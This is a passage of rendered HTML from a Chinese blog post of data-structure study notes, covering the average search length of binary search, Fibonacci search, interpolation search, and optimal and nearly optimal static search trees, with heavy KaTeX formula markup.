xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><msup><mn>2</mn><mi>h</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n=2^h-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.932438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h=log_2(n+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>,层次<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span>的结点有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>h</mi><mo>+</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{h+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></p><p>个，假定每个记录的查找概率相同,则</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mi>j</mi><mo>∗</mo><msup><mn>2</mn><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mfrac><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mi>n</mi></mfrac><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ASL=\frac{1}{n}\sum\limits_{j=1}^kj*2^{j-1}=\frac{n+1}{n}log_2(n+1)-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2498900000000006em;vertical-align:-1.4137769999999998em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.874664em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.874664em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p></li></ul></li></ul></li><li><p>斐波那契查找</p><ul><li><p>基本思想:在<mark>二分查找的基础</mark>上根据斐波那契数列进行分割。在斐波那契数列找一个等于略大于查找表中元素个数的数F[n]，将原查找表扩展为长度为Fn，完成后进行斐波那契分割，即F[n]个元素分割为前半部分F[n-1]个元素，后半部分F[n-2]个元素，找出要查找的元素在那一部分并递归，直到找到。</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530151942914.png" class="" alt="image-20240530151942914" loading="lazy"><ul><li><p>mid=low+F[u-1]-1</p></li><li><p>查找表的长度需要是F[u-1]-1,如果长度不够,需要拓展</p></li><li><p>若相等，则查找成功</p></li><li><p>若key &lt; a[Fu-1] ，则继续在 a[1] 至 a[Fu-1 - 1] 的子表中进行查找</p></li><li><p>若key &gt; a[Fu-1] ，则继续在 a[Fu-1 + 1] 至 a[Fu - 1] 的子表中进行查找。该子表的长度为 Fu-2 - 1</p></li></ul></li><li><p>性能:平均性能比折半查找好，但最坏情况下（虽然时间复杂度仍为O(logn)）的性能却比折半查找差。它还有一个有点就是分割时只需加减运算，而二分法需要除2，除法的效率比加减法差</p></li></ul></li><li><p>插值查找</p><ul><li><p>基本思想:是<mark>二分查找</mark>的提升版,选取<mark>mid</mark>的位置是随着<code>key</code>而决定</p></li><li><p>在折半查找中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>i</mi><mi>d</mi><mo>=</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo>+</mo><mo stretchy="false">(</mo><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>−</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">)</mo><mo>∗</mo><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">mid=low+(high-low)*\frac{1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>可以进行优化<strong>用key在整序列中的占比来代替原来固定的1/2</strong></p><p>因此在插值查找中</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mi>i</mi><mi>d</mi><mo>=</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo>+</mo><mo stretchy="false">(</mo><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>−</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">)</mo><mo>∗</mo><mfrac><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mo>−</mo><mi>a</mi><mo stretchy="false">[</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">]</mo></mrow><mrow><mi>a</mi><mo stretchy="false">[</mo><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo stretchy="false">]</mo><mo>−</mo><mi>a</mi><mo stretchy="false">[</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">]</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">mid=low+(high-low)*\frac{key-a[low]}{a[high]-a[low]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">]</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>其他保持不变</p></li><li><p>性能: 如果表长较长，且关键字分布均匀，插值查找算法的平均性能比折半查找要好很多，如果表中关键字分布极端不均匀，就不如折半查找</p></li></ul></li></ul><h4 id="静态树表查找"><a class="markdownIt-Anchor" href="#静态树表查找"></a> 静态树表查找</h4><p><mark>前面讨论的情况都是在查找表中各关键字被查找概率相同的前提下进行的</mark></p><p>在<mark>各关键字查找概率不同的情况</mark>下，根据ASL,使用上述算法效率就不高，因此需要进一步优化</p><ul><li><p>静态最优查找树（带权内路径长度之和PH值最小),<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>代表权值,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>代表结点所在的层次数,PH最小，查找性能最优</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mi>H</mi><mo>=</mo><mi mathvariant="normal">Σ</mi><mrow><msub><mi>w</mi><mi>i</mi></msub><msub><mi>h</mi><mi>i</mi></msub></mrow></mrow><annotation encoding="application/x-tex">PH=\Sigma{w_ih_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord">Σ</span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>手动构造的方法就是:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>越大，就越在上层</p><p>代码实现:代价比较高，时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，有一种构造方式创建的判定树的查找性能同最优查找树仅差 1% - 2%，称这种极度接近于最优查找树的二叉树为次优查找树。</p></li><li><p>构造次优查找树</p><ul><li><p><strong>基本思想</strong>:选出一个结点，使得它左右两侧的子数组的<strong>权值累加和之差</strong>的绝对值最小。把这个结点当做根节点，递归地用刚才的左右字数组构造它的左右子树。</p></li><li><p>已知序列{rl…rh}对应权值为{wl…wh}，定义<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi><msub><mi>P</mi><mi>i</mi></msub><mo>=</mo><mi mathvariant="normal">∣</mi><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mi>h</mi></msubsup><msub><mi>w</mi><mi>j</mi></msub><mo>−</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mi>l</mi></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msubsup><mi>w</mi><mi>j</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">\Delta{P_i}=|\sum\limits_{j=i+1}^hw_j-\sum\limits_{j=l}^{i-1}wj|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord">Δ</span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.64989em;vertical-align:-1.113777em;"></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5361130000000003em;"><span style="top:-2.122331em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0000050000000003em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op">∑</span></span></span><span style="top:-3.950005em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.113777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.64989em;vertical-align:-1.138221em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5116690000000004em;"><span style="top:-2.097887em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span style="top:-3.0000050000000003em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op">∑</span></span></span><span style="top:-3.950005em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.138221em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord">∣</span></span></span></span></p><p>如果对每一个元素都这样计算就有很多重复计算，效率低，我们引入累计权值和swj就可以快速求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi 